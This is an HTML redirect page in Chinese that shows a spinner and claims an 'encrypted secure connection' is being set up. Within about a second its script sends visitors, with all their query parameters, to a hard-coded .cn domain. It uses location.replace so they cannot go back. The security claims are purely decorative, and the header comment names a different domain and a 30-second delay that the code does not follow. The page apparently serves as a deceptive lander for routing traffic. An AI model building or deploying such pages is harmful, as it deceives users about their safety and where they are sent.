<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>安全连接中...</title>
    <style>
        /* ===== 全局重置 & 基础 ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            /* 极淡的微光点缀，提升质感但不破坏白背景 */
            background-image: radial-gradient(ellipse at 50% 30%, rgba(52, 152, 219, 0.03) 0%, transparent 70%);
        }

        /* ===== 主容器 ===== */
        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 24px;
            width: 100%;
            max-width: 480px;
            text-align: center;
            animation: fadeIn 0.6s ease;
        }

        /* ===== 加载圆环 ===== */
        .spinner-wrapper {
            position: relative;
            width: 80px;
            height: 80px;
            margin-bottom: 32px;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 5px solid #eef2f7;
            border-top-color: #3498db;
            border-right-color: #3498db;
            animation: spin 0.9s cubic-bezier(0.6, 0.0, 0.4, 1.0) infinite;
            will-change: transform;
            box-shadow: 0 0 0 0 rgba(52, 152, 219, 0.0);
            transition: box-shadow 0.3s;
        }

        /* 外圈光晕 — 极淡的辉光，增强“安全”质感 */
        .spinner-wrapper::after {
            content: '';
            position: absolute;
            top: -8px;
            left: -8px;
            right: -8px;
            bottom: -8px;
            border-radius: 50%;
            background: radial-gradient(circle at center, rgba(52, 152, 219, 0.06) 0%, transparent 70%);
            z-index: -1;
            animation: pulseGlow 2.4s ease-in-out infinite;
        }

        /* ===== 文字区域 ===== */
        .main-text {
            font-size: 1.5rem;
            font-weight: 500;
            color: #1e2a3e;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            line-height: 1.4;
        }

        .main-text .dot-animation {
            display: inline-block;
            animation: dotPulse 1.6s ease-in-out infinite;
        }

        .sub-text {
            font-size: 0.95rem;
            color: #8a9aa8;
            font-weight: 400;
            letter-spacing: 0.3px;
            margin-bottom: 28px;
        }

        .sub-text .lock-icon {
            display: inline-block;
            margin-right: 6px;
            font-size: 0.9rem;
        }

        /* ===== 手动跳转按钮（轻量） ===== */
        .manual-link {
            display: inline-block;
            padding: 10px 28px;
            font-size: 0.95rem;
            font-weight: 500;
            color: #3498db;
            background: rgba(52, 152, 219, 0.08);
            border-radius: 40px;
            text-decoration: none;
            cursor: pointer;
            border: none;
            transition: all 0.25s ease;
            letter-spacing: 0.3px;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        .manual-link:hover {
            background: rgba(52, 152, 219, 0.15);
            transform: translateY(-1px);
        }

        .manual-link:active {
            transform: translateY(1px);
            background: rgba(52, 152, 219, 0.20);
        }

        .manual-link .arrow {
            display: inline-block;
            transition: transform 0.25s ease;
        }

        .manual-link:hover .arrow {
            transform: translateX(4px);
        }

        /* ===== 底部安全提示（极简） ===== */
        .footer-hint {
            margin-top: 40px;
            font-size: 0.75rem;
            color: #b0bec5;
            letter-spacing: 0.5px;
            font-weight: 400;
            opacity: 0.7;
            transition: opacity 0.3s;
        }

        .footer-hint:hover {
            opacity: 1;
        }

        .footer-hint span {
            display: inline-block;
            margin: 0 6px;
        }

        /* ===== 动画关键帧 ===== */
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes pulseGlow {
            0%,
            100% {
                transform: scale(1);
                opacity: 0.5;
            }
            50% {
                transform: scale(1.08);
                opacity: 1;
            }
        }

        @keyframes dotPulse {
            0%,
            20% {
                opacity: 0.2;
                transform: translateY(0);
            }
            40% {
                opacity: 1;
                transform: translateY(-2px);
            }
            60%,
            100% {
                opacity: 0.2;
                transform: translateY(0);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(12px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ===== 响应式适配 ===== */
        @media (max-width: 600px) {
            .spinner-wrapper {
                width: 64px;
                height: 64px;
                margin-bottom: 26px;
            }

            .spinner {
                border-width: 4px;
            }

            .main-text {
                font-size: 1.2rem;
            }

            .sub-text {
                font-size: 0.85rem;
                margin-bottom: 22px;
            }

            .manual-link {
                padding: 8px 22px;
                font-size: 0.85rem;
            }

            .footer-hint {
                font-size: 0.65rem;
                margin-top: 32px;
            }
        }

        @media (max-width: 400px) {
            .spinner-wrapper {
                width: 52px;
                height: 52px;
                margin-bottom: 20px;
            }

            .spinner {
                border-width: 3.5px;
            }

            .main-text {
                font-size: 1.0rem;
            }

            .sub-text {
                font-size: 0.75rem;
            }

            .manual-link {
                padding: 6px 18px;
                font-size: 0.78rem;
            }
        }

        /* ===== 暗黑模式自适应（白背景不变，但文字微调） ===== */
        @media (prefers-color-scheme: dark) {
            body {
                background: #ffffff;
                /* 强制白背景，不受暗黑模式影响 */
            }

            .main-text {
                color: #1e2a3e;
            }

            .sub-text {
                color: #8a9aa8;
            }

            .footer-hint {
                color: #b0bec5;
            }

            .spinner {
                border-color: #eef2f7;
                border-top-color: #3498db;
                border-right-color: #3498db;
            }
        }
    </style>
</head>
<body>

    <!-- ===== 主加载界面 ===== -->
    <div class="loading-container" id="app">
        <!-- 加载圆环 -->
        <div class="spinner-wrapper">
            <div class="spinner" role="status" aria-label="加载中"></div>
        </div>

        <!-- 主文字 -->
        <div class="main-text">
            正在进入安全连接<span class="dot-animation">...</span>
        </div>

        <!-- 副文字 -->
        <div class="sub-text">
            <span class="lock-icon">🔒</span> 安全连接已加密 · 请稍候
        </div>

        <!-- 手动跳转按钮 -->
        <button class="manual-link" id="manualRedirect">
            立即进入 <span class="arrow">→</span>
        </button>

        <!-- 底部提示 -->
        <div class="footer-hint">
            <span>●</span> 安全通道建立中 <span>●</span>
        </div>
    </div>

    <script>
        // ================================================================
        //  功能说明：
        //  1. 页面加载后自动进入「安全连接」过渡状态。
        //  2. 30 秒后自动跳转至目标地址，并携带当前页面的完整查询参数。
        //  3. 点击「立即进入」按钮可立即跳转，取消等待。
        //  4. 目标地址固定为：https://ipp.alwllbj.cn/home
        //  5. 保留当前页面 URL 中的所有查询参数（如 ?123 或 ?foo=bar&id=5）
        //  6. 跳转使用 window.location.replace()，用户无法通过后退返回。
        // ================================================================

        // -------- 配置 --------
        const BASE_TARGET = 'https://mibgbh.cn/home';
        const AUTO_DELAY_SECONDS = 1; // 自动跳转等待秒数

        // -------- 状态 --------
        let hasRedirected = false;
        let autoTimer = null;
        let countdownInterval = null;

        // -------- DOM 引用 --------
        const manualBtn = document.getElementById('manualRedirect');
        const mainTextEl = document.querySelector('.main-text');
        const subTextEl = document.querySelector('.sub-text');

        // -------- 工具函数 --------
        function getCurrentQueryString() {
            return window.location.search; // 例如 "?123" 或 "?foo=bar" 或 ""
        }

        function buildTargetUrl() {
            const query = getCurrentQueryString();
            // 拼接：BASE_TARGET + 查询参数 + '#'
            // '#' 保留用于目标应用的前端路由兼容
            return BASE_TARGET + query + '#';
        }

        // -------- 核心跳转（仅执行一次） --------
        function executeRedirect() {
            if (hasRedirected) return;
            hasRedirected = true;

            // 清除所有定时器
            if (autoTimer) {
                clearTimeout(autoTimer);
                autoTimer = null;
            }
            if (countdownInterval) {
                clearInterval(countdownInterval);
                countdownInterval = null;
            }

            const finalUrl = buildTargetUrl();
            console.log('[跳转] 目标地址:', finalUrl);
            window.location.replace(finalUrl);
        }

        // -------- 更新界面提示（倒计时反馈） --------
        function updateStatusText(secondsLeft) {
            if (subTextEl) {
                if (secondsLeft > 0) {
                    subTextEl.innerHTML =
                        `<span class="lock-icon">🔒</span> 安全连接已加密 · 即将进入 (${secondsLeft}s)`;
                } else {
                    subTextEl.innerHTML = `<span class="lock-icon">🔒</span> 安全连接已加密 · 正在跳转...`;
                }
            }
        }

        // -------- 启动自动跳转倒计时 --------
        function startAutoRedirect() {
            let secondsLeft = AUTO_DELAY_SECONDS;

            // 立即更新一次显示
            updateStatusText(secondsLeft);

            // 每秒更新倒计时
            countdownInterval = setInterval(() => {
                secondsLeft--;
                if (secondsLeft <= 0) {
                    // 倒计时归零，清除计时器并跳转
                    if (countdownInterval) {
                        clearInterval(countdownInterval);
                        countdownInterval = null;
                    }
                    updateStatusText(0);
                    executeRedirect();
                } else {
                    updateStatusText(secondsLeft);
                }
            }, 1000);

            // 兜底：30 秒后强制跳转（防止 setInterval 被阻塞）
            autoTimer = setTimeout(() => {
                if (!hasRedirected) {
                    if (countdownInterval) {
                        clearInterval(countdownInterval);
                        countdownInterval = null;
                    }
                    executeRedirect();
                }
            }, AUTO_DELAY_SECONDS * 1000 + 500);
        }

        // -------- 手动跳转（点击按钮） --------
        if (manualBtn) {
            manualBtn.addEventListener('click', function(e) {
                e.preventDefault();
                // 清除所有倒计时
                if (countdownInterval) {
                    clearInterval(countdownInterval);
                    countdownInterval = null;
                }
                if (autoTimer) {
                    clearTimeout(autoTimer);
                    autoTimer = null;
                }
                // 立即跳转
                executeRedirect();
            });
        }

        // -------- 页面加载完成后初始化 --------
        function init() {
            // 延迟 200ms 后开始倒计时，让页面加载动画先展示出来
            setTimeout(() => {
                if (!hasRedirected) {
                    startAutoRedirect();
                }
            }, 200);

            // 控制台输出调试信息
            console.log('[安全连接] 当前查询参数:', getCurrentQueryString() || '(无参数)');
            console.log('[安全连接] 目标地址:', buildTargetUrl());
            console.log(`[安全连接] ${AUTO_DELAY_SECONDS} 秒后自动跳转`);
        }

        // 确保 DOM 就绪
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }

        // 额外保险：从 bfcache 恢复时重新激活
        window.addEventListener('pageshow', function(event) {
            if (!hasRedirected && !document.querySelector('.loading-container')) {
                // 极端情况，页面内容丢失则重新初始化
                init();
            }
        });

        // 防止用户通过右键/手势返回时再次触发跳转（由 replace 保证）
        console.log('[安全连接] 已就绪，等待跳转...');
    </script>

</body>
</html>
